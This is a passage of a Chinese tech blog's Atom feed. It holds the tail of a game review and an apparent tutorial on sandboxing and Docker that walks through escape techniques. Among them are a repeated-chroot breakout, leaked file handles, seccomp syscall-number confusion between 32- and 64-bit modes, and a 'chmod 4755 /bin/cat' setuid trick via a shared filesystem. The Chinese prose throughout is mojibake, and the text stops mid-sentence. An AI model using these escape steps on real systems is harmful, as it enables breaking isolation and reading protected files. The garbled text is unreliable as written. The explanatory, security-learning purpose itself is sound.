title="é…éŸ³/é…ä¹"></a>é…éŸ³/é…ä¹</h2><p>æ¸¸æˆä¸­æœ‰ä¸å°‘å¤–å›½äººï¼ˆè‹±å›½äººï¼‰ï¼Œè‹±æ–‡é…éŸ³çš„ä¼¦æ•¦è…”æŒºå†²ï¼Œæœ‰ç§åœ¨å¬å°å­¦è‹±è¯­å¬åŠ›çš„æ„Ÿè§‰ï¼Œä¸è¿‡å€’æ˜¯ç¬¦åˆäººç‰©è®¾å®šã€‚æ¸¸æˆä¸­è¿˜æœ‰ä¸€æ®µæ˜¯å¤–å›½äººè¯´ç€è¹©è„šä¸­æ–‡ï¼Œæ­¤æ—¶çš„å­—å¹•ä¹Ÿæ˜¯æ•…æ„ä½¿ç”¨é”™åˆ«å­—ï¼ŒæŒºæœ‰è¶£ã€‚ç¾ä¸­ä¸è¶³çš„æ˜¯æœ‰äº›ç‰‡æ®µåªæœ‰å­—å¹•æ²¡æœ‰é…éŸ³ã€‚ä»¥åŠéƒ¨åˆ†é…éŸ³ç‰‡æ®µæ˜æ˜¾å‰åéŸ³è‰²æœ‰å·®è·ï¼Œæœ‰äº›å‡ºæˆã€‚</p><p>æ¸¸æˆçš„é…ä¹ååˆ†å‡ºå½©ï¼Œåšåˆ°äº†æ ¹æ®å‰§æƒ…çš„å˜åŒ–æ— ç¼åˆ‡æ¢ï¼Œèƒ½å¾ˆå¥½åœ°è®©ç©å®¶æ²‰æµ¸åˆ°æ¸¸æˆä¸­å»ã€‚ç”±äºä¸€ä¸ªäººåœ¨è€å®¶çš„å¤§æˆ¿å­é‡Œç©ï¼Œæ—¶å¸¸è¢«å‰§æƒ…é…åˆèƒŒæ™¯éŸ³ä¹å“å¾—å¿ƒæ…Œã€‚</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p><img src="https://bu.dusays.com/2024/02/16/65cf6a684127c.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2024/02/16/65cf6a684127c.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>æ¸¸æˆä¸­ä¼šé€šè¿‡æ”¶è—å¤¹çš„æ–¹å¼ä»‹ç»éå¸¸å¤šçš„å²å®å’ŒçŸ¥è¯†ï¼Œå¯¹äºæˆ‘è¿™ç§ä¸€å¹´è¯»ä¸äº†å‡ æœ¬é—²ä¹¦çš„äººæ¥è¯´éå¸¸æœ‰è¶£ã€‚åŒæ—¶è¿™ç§æ–¹å¼ä¹Ÿèƒ½è®©ç©å®¶æ›´å¥½åœ°äº†è§£èƒŒæ™¯çŸ¥è¯†ã€æ›´èƒ½å¤Ÿä»£å…¥åˆ°æ¯ä¸€ä¸ªè§’è‰²ä¸­å»ã€‚</p><p>ä¹‹å‰ä¹Ÿå¬è¯´è¿™éƒ¨ä½œå“ä»ã€Šé€†è½¬è£åˆ¤ã€‹ç³»åˆ—ä¸­å€Ÿé‰´äº†è®¸å¤šï¼Œä¸è¿‡æˆ‘æ²¡æœ‰ç©è¿‡ã€Š é€†è½¬è£åˆ¤ã€‹ç³»åˆ—ï¼Œå› æ­¤ä¸èƒ½åšä¸€ä¸ªå®¢è§‚çš„è¯„ä»·ã€‚ä½†è¿™éƒ¨ä½œå“åœ¨ç»“å°¾è‡´è°¢äº†è®¸å¤šå‚ä¸åˆ¶ä½œçš„äººå‘˜ä»¥åŠå€Ÿé‰´çš„æ¸¸æˆã€å°è¯´ç­‰å„ç§ä½œå“ï¼Œå€Ÿé‰´çš„ä½œå“åœ¨é¦–é¡µèƒ½å¤Ÿç‚¹å¼€çš„å¼€å‘è€…å¯„è¯­ä¸­ä¹Ÿæœ‰ï¼š</p><p><img src="https://bu.dusays.com/2024/02/16/65cf6b2fd6e3c.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/02/16/65cf6b2fd6e3c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>é‚£ä¹ˆè‡³å°‘æ¸¸æˆåˆ¶ä½œæ–¹æ˜¯å¿ƒæ€€æ„Ÿæ¿€ã€å°Šé‡çŸ¥è¯†äº§æƒçš„ï¼Œè¿™ç‚¹å°±å€¼å¾—å›½å†…è®¸å¤šæ¸¸æˆå‚å•†å­¦ä¹ äº†ã€‚ä¹‹åä¹Ÿä¼šå†å“é‰´ã€Šé€†è½¬è£åˆ¤ã€‹ç³»åˆ—ï¼Œä»¥ä¾¿æ›´å¥½åœ°è¯„ä»·è¯¥ä½œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ”¶åˆ°æœ‹å‹çš„å®‰åˆ©ï¼Œè¶ç€è¿‡å¹´æ‰“æŠ˜å…¥æ‰‹äº†ã€Šå±±æ²³æ—…æ¢ã€‹ã€‚å…¶å®æˆ‘æ­¤å‰å¾ˆå°‘ç©æ¨ç†æ¸¸æˆï¼Œå¯èƒ½æ˜¯å› ä¸ºä»¥å‰ç©å‰§æœ¬æ€æ—¶æˆ‘ä¹Ÿé²œæœ‰å‡†ç¡®çš„æ¨ç†ã€‚ä¸€å¼€å§‹å¸å¼•æˆ‘çš„ï¼Œæ˜¯ã€Šå±±æ²³æ—…æ¢ã€‹çš„æ°´å¢¨é£ä»¥åŠæ®è¯´ç²¾å½©çš„å‰§æƒ…ã€‚äº‹å®è¯æ˜ï¼Œã€Šå±±æ²³æ—…æ¢ã€‹ä¸åªæœ‰è¿™äº›ä¼˜ç‚¹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ç”»é£&quot;&gt;&lt;a href=&quot;#ç”»é£&quot;</summary>
      
    
    
    
    <category term="æ¸¸æˆ" scheme="https://blog.beacox.space/categories/%E6%B8%B8%E6%88%8F/"/>
    
    
    <category term="æ¨ç†" scheme="https://blog.beacox.space/tags/%E6%8E%A8%E7%90%86/"/>
    
    <category term="2D" scheme="https://blog.beacox.space/tags/2D/"/>
    
  </entry>
  
  <entry>
    <title>æ²™ç®±ä¸Docker</title>
    <link href="https://blog.beacox.space/posts/sandboxing-docker/"/>
    <id>https://blog.beacox.space/posts/sandboxing-docker/</id>
    <published>2023-09-16T14:37:53.000Z</published>
    <updated>2023-09-16T14:37:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ²™ç®±æŠ€æœ¯æ‚è°ˆ"><a href="#æ²™ç®±æŠ€æœ¯æ‚è°ˆ" class="headerlink" title="æ²™ç®±æŠ€æœ¯æ‚è°ˆ"></a>æ²™ç®±æŠ€æœ¯æ‚è°ˆ</h2><h3 id="ä¸ºä»€ä¹ˆæ²™ç®±æŠ€æœ¯è¢«ç§°ä¸ºæ²™ç®±æŠ€æœ¯ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ²™ç®±æŠ€æœ¯è¢«ç§°ä¸ºæ²™ç®±æŠ€æœ¯ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ²™ç®±æŠ€æœ¯è¢«ç§°ä¸ºæ²™ç®±æŠ€æœ¯ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ²™ç®±æŠ€æœ¯è¢«ç§°ä¸ºæ²™ç®±æŠ€æœ¯ï¼Ÿ</h3><p>åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œæ²™ç®±æ˜¯ä¸€ä¸ªè£…æ»¡æ²™å­çš„å°ç®±å­ï¼Œå°å­©å„¿ä»¬å¯ä»¥åœ¨æ²™ç®±é‡Œé¢å‘æŒ¥è‡ªå·±çš„æƒ³è±¡åŠ›â€”â€”å»ºæ²™å ¡ã€ç”»ç”»ç­‰ï¼Œè€Œä¸ä¼šå°†æ²™å­å¼„å¾—æ»¡åœ°éƒ½æ˜¯ã€‚</p><p>åœ¨è®¡ç®—æœºå®‰å…¨é¢†åŸŸï¼Œæ²™ç®±æŠ€æœ¯çš„ä¸»è¦ç›®æ ‡æ˜¯<strong>éš”ç¦»å’Œä¿æŠ¤ç¨‹åº</strong>ï¼Œä»¥é˜²æ­¢å®ƒä»¬å¯¹ç³»ç»Ÿæˆ–å…¶ä»–åº”ç”¨ç¨‹åºé€ æˆä¸å¿…è¦çš„æŸå®³æˆ–å¹²æ‰°ã€‚</p><h3 id="æ²™ç®±æŠ€æœ¯çš„å†å²"><a href="#æ²™ç®±æŠ€æœ¯çš„å†å²" class="headerlink" title="æ²™ç®±æŠ€æœ¯çš„å†å²"></a>æ²™ç®±æŠ€æœ¯çš„å†å²</h3><p>æ—©åœ¨ä¸Šä¸–çºª60å¹´ä»£ï¼Œå°±å·²ç»é€šè¿‡ç¡¬ä»¶å®ç°äº†ç³»ç»Ÿå’Œè¿›ç¨‹ä»£ç çš„éš”ç¦»ã€‚</p><p>80å¹´ä»£ï¼Œé€šè¿‡ç¡¬ä»¶æ–¹æ³•éš”ç¦»ä¸åŒè¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€‚VAX/VMSæ“ä½œç³»ç»Ÿå¼•å…¥äº†â€è®¿é—®æ§åˆ¶åˆ—è¡¨â€çš„æ¦‚å¿µï¼Œå…è®¸ç®¡ç†å‘˜å¯¹æ–‡ä»¶å’Œèµ„æºè¿›è¡Œæ›´ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ã€‚è¿™æ˜¯éš”ç¦»å’Œæ§åˆ¶è®¿é—®çš„é‡è¦æ­¥éª¤ã€‚</p><p>90å¹´ä»£ï¼Œäº’è”ç½‘é€æ¸å¼€å§‹æ™®åŠã€‚äº§ç”Ÿäº†è§£é‡Šå™¨å’Œè¢«è§£é‡Šçš„ä»£ç ä¹‹é—´çš„éš”ç¦»ï¼Œä»¥åŠJavaè™šæ‹Ÿæœºï¼ˆJVMï¼‰ç­‰æ—©æœŸæ²™ç®±æŠ€æœ¯ã€‚</p><p>2000å¹´å·¦å³ï¼Œæ˜¯é’ˆå¯¹æµè§ˆå™¨çš„ç½‘ç»œæ”»å‡»æœ€ç››ä¹‹æ—¶ã€‚</p><p>è€Œ2010å¹´å‰åï¼Œç°ä»£æ²™ç®±æŠ€æœ¯å´›èµ·äº†ï¼Œ<strong>ä¸»è¦ç”¨äºæµè§ˆå™¨</strong>ï¼Œè®©ä¸è¢«ä¿¡ä»»çš„ä»£ç ã€æ•°æ®è¢«æ”¾ç½®äºä¸€ä¸ªè¢«éš”ç¦»çš„è¿›ç¨‹ä¸­ã€‚å½“è¢«éš”ç¦»çš„è¿›ç¨‹ï¼ˆå­è¿›ç¨‹ï¼‰æƒ³è¦æ‰§è¡Œä¸€äº›éœ€è¦æˆæƒçš„æ“ä½œæ—¶ï¼Œéœ€è¦å‘çˆ¶è¿›ç¨‹ï¼ˆå¦‚Firefoxï¼‰è¯·æ±‚ï¼Œå¾—åˆ°å…è®¸åæ–¹å¯æ‰§è¡Œã€‚</p><h2 id="æ²™ç®±é€ƒé€¸"><a href="#æ²™ç®±é€ƒé€¸" class="headerlink" title="æ²™ç®±é€ƒé€¸"></a>æ²™ç®±é€ƒé€¸</h2><h3 id="chroot"><a href="#chroot" class="headerlink" title="chroot()"></a>chroot()</h3><p><code>chroot()</code>ç³»ç»Ÿè°ƒç”¨æœ€æ—©äº1979å¹´å‡ºç°åœ¨Unixç³»ç»Ÿï¼Œç„¶åå‡ºç°åœ¨BSDç³»ç»Ÿã€‚è¿™æ˜¯ä¸€ç§ä¼ ç»Ÿæ²™ç›’ã€‚</p><p><code>chroot('/sandbox')</code>çš„ä½œç”¨æ˜¯è®©è°ƒç”¨è¯¥å‡½æ•°çš„è¿›ç¨‹ä»¥åŠå…¶å­è¿›ç¨‹<strong>è®¤ä¸ºæ ¹ç›®å½•</strong>æ˜¯<code>/sandbox</code>ï¼Œåœ¨<code>/sandbox</code>ä¸­æ—¶ï¼Œä¸èƒ½<code>cd ../</code>åˆ°çœŸæ­£çš„æ ¹ç›®å½•ï¼Œå› æ­¤ä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†è¿›ç¨‹å¯¹<code>/sandbox</code>å¤–èµ„æºçš„è®¿é—®ã€‚</p><h4 id="è·¯å¾„ç©¿è¶Š"><a href="#è·¯å¾„ç©¿è¶Š" class="headerlink" title="è·¯å¾„ç©¿è¶Š"></a>è·¯å¾„ç©¿è¶Š</h4><p>è€ƒè™‘åœ¨æ ¹ç›®å½•è¿è¡Œå¦‚ä¸‹Cä»£ç ï¼ˆä¸å®Œæ•´ï¼‰ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chroot(<span class="string">"/sandbox"</span>);</span><br><span class="line">execl(<span class="string">"/busybox"</span>, <span class="string">"sh"</span>, <span class="number">0</span>); <span class="comment">// Busyboxåœ¨å•ä¸€çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­æä¾›äº†ç²¾ç®€çš„Unixå·¥å…·é›†ï¼Œåœ¨è¿™å¯ä»¥ç†è§£ä¸ºè¿è¡Œäº†ä¸€ä¸ªLinuxç³»ç»Ÿ</span></span><br></pre></td></tr></tbody></table></figure><p>åˆçœ‹ï¼š<code>busybox</code>è¿è¡Œï¼Œå®ƒè®¤ä¸ºè‡ªå·±çš„æ ¹ç›®å½•æ˜¯<code>/sandbox</code>ã€‚ä½†é—®é¢˜æ˜¯ï¼Œè°ƒç”¨<code>chroot()</code><strong>ä¸ä¼šè‡ªåŠ¨æ›´æ”¹å·¥ä½œç›®å½•</strong>ï¼Œå› æ­¤<code>busybox</code>çš„å·¥ä½œç›®å½•è¿˜åœ¨æ ¹ç›®å½•ï¼Œå¯èƒ½å¯ä»¥å€Ÿç”±è¿™ä¸ªå·¥ä½œç›®å½•è®¿é—®æ²™ç®±å¤–çš„èµ„æºã€‚</p><h4 id="èµ„æºæœªå…³é—­"><a href="#èµ„æºæœªå…³é—­" class="headerlink" title="èµ„æºæœªå…³é—­"></a>èµ„æºæœªå…³é—­</h4><p>ä»…ä»…æ‰§è¡Œ<code>chroot()</code>ï¼Œå¹¶ä¸ä¼šå°†å…ˆå‰æ‰“å¼€çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶ï¼‰å…³é—­ï¼ˆç•™ä¸‹æ–‡ä»¶å¥æŸ„ï¼‰ã€‚</p><p>Linuxä¸­æœ‰è®¸å¤šåç¼€ä¸º<code>at</code>çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥æ ¹æ®ç›®å½•ï¼ˆçš„å¥æŸ„ï¼‰å’Œç›¸å¯¹è·¯å¾„æ‰¾åˆ°æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä¾‹å­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execveat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">char</span> *pathname, <span class="type">char</span> **argv, <span class="type">char</span> **envp, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœå…ˆå‰æœ‰æ‰“å¼€çš„ç›®å½•æœªé‡Šæ”¾å¥æŸ„ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“åˆ©ç”¨å¥æŸ„è®¿é—®ä»»æ„æ–‡ä»¶ã€‚</p><h4 id="é‡å¤è°ƒç”¨chroot"><a href="#é‡å¤è°ƒç”¨chroot" class="headerlink" title="é‡å¤è°ƒç”¨chroot()"></a>é‡å¤è°ƒç”¨chroot()</h4><p>è°ƒç”¨äº†ä¸€æ¬¡<code>chroot()</code>åï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®é™åˆ¶ï¼Œå¯ä»¥å†æ¬¡è°ƒç”¨<code>chroot()</code>ã€‚è€ƒè™‘ä»¥ä¸‹æƒ…å†µï¼š</p><p>ä½äºæ ¹ç›®å½•ä¸º<code>/sandbox</code>çš„æ²™ç®±ä¸­ï¼ˆå·²ç»æ‰§è¡Œ<code>chroot("/sandbox");</code>ï¼‰ã€‚</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> springboard<span class="comment"># åœ¨æ²™ç®±çš„æ ¹ç›®å½•ä¸­åˆ›å»ºç›®å½•</span></span><br><span class="line"><span class="built_in">chroot</span> springboard<span class="comment"># ç°åœ¨è¿›ç¨‹è®¤ä¸º/sandbox/springboardæ˜¯å®ƒçš„æ ¹ç›®å½•</span></span><br><span class="line"><span class="comment"># ä½†æ˜¯ç°åœ¨å·¥ä½œç›®å½•æ˜¯/sandboxï¼Œæˆ‘ä»¬å®é™…ä¸Šå¤„äºè¿›ç¨‹æ‰€è®¤ä¸ºçš„æ ¹ç›®å½•å¤–é¢ï¼Œå› æ­¤ä¸å—é™åˆ¶</span></span><br><span class="line"><span class="comment"># chdir ../../</span></span><br><span class="line"><span class="comment"># ç°åœ¨å·¥ä½œç›®å½•å°±æ˜¯/</span></span><br><span class="line"><span class="comment"># æˆ‘ä»¬å·²ç»åˆ°è¾¾äº†çœŸæ­£çš„æ ¹ç›®å½•</span></span><br></pre></td></tr></tbody></table></figure><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><p><code>seccomp</code>è¢«ç§°ä½œ<strong>ç³»ç»Ÿè°ƒç”¨çš„é˜²ç«å¢™</strong>ã€‚å¯ä»¥ç¦ç”¨æŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€…åŸºäºå‚æ•°æ¥ç¦ç”¨ã€‚<br>dockerã€chromeã€firefoxç­‰ï¼Œéƒ½ä¾èµ–äº<code>seccomp</code>ã€‚</p><p><code>seccomp</code>çš„è§„åˆ™å°†ä¼šè¢«<code>children</code>ç»§æ‰¿</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scmp_filter_ctx ctx;<span class="comment">//seccompè¿‡æ»¤è§„åˆ™çš„æ•°æ®ç»“æ„</span></span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);<span class="comment">//åˆå§‹åŒ–seccomp, å…è®¸æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>); <span class="comment">//ç¦æ­¢ execve ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">seccomp_load(ctx);<span class="comment">//åº”ç”¨è§„åˆ™</span></span><br><span class="line"></span><br><span class="line">execl(<span class="string">"/bin/cat"</span>, <span class="string">"cat"</span>, <span class="string">"/flag"</span>, (<span class="type">char</span> *)<span class="number">0</span>);<span class="comment">//è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨ execveï¼Œå°†è¢« kill</span></span><br></pre></td></tr></tbody></table></figure><p>æ›´å¤šä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man seccomp_rule_add</span><br></pre></td></tr></tbody></table></figure><h4 id="å®½æ¾çš„è¿‡æ»¤è§„åˆ™"><a href="#å®½æ¾çš„è¿‡æ»¤è§„åˆ™" class="headerlink" title="å®½æ¾çš„è¿‡æ»¤è§„åˆ™"></a>å®½æ¾çš„è¿‡æ»¤è§„åˆ™</h4><p>Linuxç³»ç»Ÿç°åœ¨æœ‰300å¤šç§ç³»ç»Ÿè°ƒç”¨ï¼Œä¸”ä»ç„¶åœ¨ä¸æ–­æ›´æ–°ï¼Œååˆ†å¤æ‚ã€‚æ²™ç®±åº”ç”¨å¼€å‘è€…ä¸ºäº†åŠŸèƒ½ã€æ€§èƒ½æˆ–æ–¹ä¾¿ï¼Œå¯èƒ½ä¼šåˆ¶å®šç›¸å¯¹å®½æ¾çš„è¿‡æ»¤è§„åˆ™ã€‚æœ‰äº›æœªè¢«å…è®¸çš„ç³»ç»Ÿè°ƒç”¨å°±æœ‰å¯èƒ½è¢«ç”¨äºé€ƒé€¸ã€‚</p><h4 id="ç³»ç»Ÿè°ƒç”¨æ··æ·†"><a href="#ç³»ç»Ÿè°ƒç”¨æ··æ·†" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨æ··æ·†"></a>ç³»ç»Ÿè°ƒç”¨æ··æ·†</h4><p>è®¸å¤š64ä½æ¶æ„å‘åå…¼å®¹äº†32ä½ã€‚åœ¨amd64ç­‰æ¶æ„ä¸­ï¼Œä½ å¯ä»¥åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­åˆ‡æ¢32/64ä½æ¨¡å¼ã€‚</p><p>ä¸è¿‡æœ‰è¶£çš„æ˜¯ï¼Œä¸åŒæ¶æ„ï¼ˆç”šè‡³æ˜¯åŒä¸€ä¸ªæ¶æ„çš„32/64ä½ï¼‰çš„ç³»ç»Ÿè°ƒç”¨å·ä¸ä¸€æ ·ã€‚ä¾‹å¦‚ï¼š</p><p><code>exit()</code>åœ¨amd64ä¸­å·ç æ˜¯60ï¼Œåœ¨x86ä¸­æ˜¯1ã€‚</p><p>åœ¨amd64æ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>seccomp</code>é»˜è®¤é…ç½®çš„æ˜¯amd64ä¸‹å…è®¸/ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœå…è®¸ä¸¤ç§æ¨¡å¼ä¸‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæ²™ç›’å¾ˆå¯èƒ½é¡¾æ­¤å¤±å½¼ã€‚</p><p>è€ƒè™‘ä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨å·</th><th>amd64</th><th>x86</th></tr></thead><tbody><tr><td>3</td><td>close</td><td>read()</td></tr><tr><td>4</td><td>stat()</td><td>write()</td></tr><tr><td>5</td><td>fstat()</td><td>open()</td></tr></tbody></table><p>å¦‚æœå¼€å‘è€…åœ¨é…ç½®è§„åˆ™æ—¶ï¼Œæœ¬æ„æ˜¯å…è®¸<code>close()</code>,   <code>stat()</code>,  <code>fstat()</code>ç³»ç»Ÿè°ƒç”¨ï¼Œä½†ç”±äº<code>seccomp</code>æ˜¯<strong>æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è¿›è¡Œè¿‡æ»¤</strong>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨32ä½çš„æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬ç«Ÿç„¶å¯ä»¥è°ƒç”¨<code>open</code>, <code>read</code>, <code>write</code>â€”â€”è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¯»å–æ–‡ä»¶çš„å†…å®¹å¹¶è¾“å‡ºåˆ°å…¶ä»–æ–‡ä»¶æˆ–æ ‡å‡†è¾“å‡ºç­‰ã€‚</p><h4 id="å†…æ ¸æ¼æ´"><a href="#å†…æ ¸æ¼æ´" class="headerlink" title="å†…æ ¸æ¼æ´"></a>å†…æ ¸æ¼æ´</h4><p>å¦‚æœæ²™ç›’çš„<code>seccomp</code>è¢«æ­£ç¡®é…ç½®ï¼Œæ”»å‡»è€…å¾ˆå‘èµ·æœ‰ç”¨çš„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·ä»ç„¶å¯ä»¥è°ƒç”¨åœ¨ç™½åå•ä¸­çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœå†…æ ¸ä¸­å«æœ‰æ¼æ´ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œæ”»å‡»è€…å°±å¯èƒ½åˆ©ç”¨è¿™äº›å†…æ ¸æ¼æ´ã€‚</p><p>å¬èµ·æ¥å¾ˆç„ä¹ï¼Œä½†å…¶å®å†…æ ¸ä¸æ™®é€šè½¯ä»¶ä¸€æ ·ï¼Œéƒ½æ˜¯ä»£ç ï¼Œéƒ½æˆ–å¤šæˆ–å°‘å­˜åœ¨æ¼æ´ï¼Œå•æ˜¯2019å¹´ä¸€å¹´ï¼Œå°±æœ‰è¶…è¿‡30ä¸ªChromeæ²™ç›’é€ƒé€¸ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†åˆ©ç”¨äº†å†…æ ¸æ¼æ´ã€‚</p><h4 id="namespaceâ€”â€”ç°ä»£è§£å†³æ–¹æ¡ˆ"><a href="#namespaceâ€”â€”ç°ä»£è§£å†³æ–¹æ¡ˆ" class="headerlink" title="namespaceâ€”â€”ç°ä»£è§£å†³æ–¹æ¡ˆ"></a>namespaceâ€”â€”ç°ä»£è§£å†³æ–¹æ¡ˆ</h4><p>å‘½åç©ºé—´æ˜¯ Linux ä¸­å¯ç”¨çš„åŠŸèƒ½ï¼Œç”¨äºéš”ç¦»ä¸åŒç³»ç»Ÿèµ„æºæ–¹é¢çš„è¿›ç¨‹ã€‚åœ¨Linuxä¸­æœ‰å¾ˆå¤šnamespaceï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>mntï¼ˆæŒ‚è½½ç‚¹ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼‰</li><li>pidï¼ˆè¿›ç¨‹ï¼‰</li><li>netï¼ˆç½‘ç»œå †æ ˆï¼‰</li><li>IPCï¼ˆç³»ç»Ÿ V IPCï¼‰</li><li>utsï¼ˆä¸»æœºåï¼‰</li><li>ç”¨æˆ·ï¼ˆUIDï¼‰</li></ul><p>ç­‰ã€‚ä½¿ç”¨æŒ‚è½½å‘½åç©ºé—´ã€pivot_rootå¯ä»¥è®©ç”¨æˆ·åªèƒ½è®¿é—®åŸæœ¬æ–‡ä»¶æ ‘çš„ä¸€éƒ¨åˆ†ã€‚</p><h4 id="åŸæœ‰rootæŒ‚è½½ç‚¹æœªåˆ é™¤"><a href="#åŸæœ‰rootæŒ‚è½½ç‚¹æœªåˆ é™¤" class="headerlink" title="åŸæœ‰rootæŒ‚è½½ç‚¹æœªåˆ é™¤"></a>åŸæœ‰rootæŒ‚è½½ç‚¹æœªåˆ é™¤</h4><p>ä¸€èˆ¬ä¼šå°†æ—§çš„æ ¹ç›®å½•æŒ‚è½½åˆ°æ²™ç®±å†…æŸä¸ªæŒ‚è½½ç‚¹ï¼Œç„¶åä½¿ç”¨<code>pivot_root</code>å°†æ ¹ç›®å½•æ¢æˆæ–°çš„â€œæ ¹ç›®å½•â€ï¼Œç„¶åå†å°†è¯¥æŒ‚è½½ç‚¹å’Œç›®å½•åˆ é™¤ã€‚å¦‚æœå¿˜è®°åˆ é™¤åŸæœ‰æŒ‚è½½ç‚¹ï¼Œåˆ™æ²™ç®±å½¢åŒè™šè®¾ã€‚</p><h4 id="å…±äº«æ–‡ä»¶ç³»ç»Ÿ"><a href="#å…±äº«æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="å…±äº«æ–‡ä»¶ç³»ç»Ÿ"></a>å…±äº«æ–‡ä»¶ç³»ç»Ÿ</h4><p>å¦‚æœæ²™ç®±å’Œå®¿ä¸»å…±ç”¨æ–‡ä»¶ç³»ç»Ÿï¼ˆæ²™ç®±å¯¹æ–‡ä»¶ç³»ç»Ÿæœ‰å†™æƒé™ï¼‰ï¼Œé‚£ä¹ˆæ²™ç®±ç”¨æˆ·å°±å¯ä»¥åˆ©ç”¨è‡ªå·±çš„rootæƒé™æ¥åœ¨æ²™ç®±å¤–æå–ã€‚<br>ä¾‹å¦‚ï¼Œåœ¨æ²™ç®±å†…ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 4755 /bin/cat</span><br></pre></td></tr></tbody></table></figure><p>é‚£ä¹ˆåœ¨æ²™ç®±å¤–çš„ä»»ä½•ç”¨æˆ·å°±éƒ½å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œcatï¼Œè¿™æ„å‘³ç€å¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶ã€‚</p><h4 id="å…ˆå‰æ‰“å¼€çš„èµ„æºæœªå…³é—­"><a href="#å…ˆå‰æ‰“å¼€çš„èµ„æºæœªå…³é—­" class="headerlink" title="å…ˆå‰æ‰“å¼€çš„èµ„æºæœªå…³é—­"></a>å…ˆå‰æ‰“å¼€çš„èµ„æºæœªå…³é—­</h4><p>ä¸<code>chroot()</code>ä¸­è®¨è®ºçš„ä¸€è‡´ã€‚</p><h4 id="setns-å’Œ-x2F-proc"><a href="#setns-å’Œ-x2F-proc" class="headerlink" title="setns()å’Œ/proc"></a>setns()å’Œ/proc</h4><p><code>setns()</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setns</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> nstype)</span>;</span><br></pre></td></tr></tbody></table></figure><p><code>fd</code>å‚æ•°æ˜¯ä¸‹åˆ—ä¸¤è€…å…¶ä¸­ä¹‹ä¸€ï¼š</p><p>â€¢   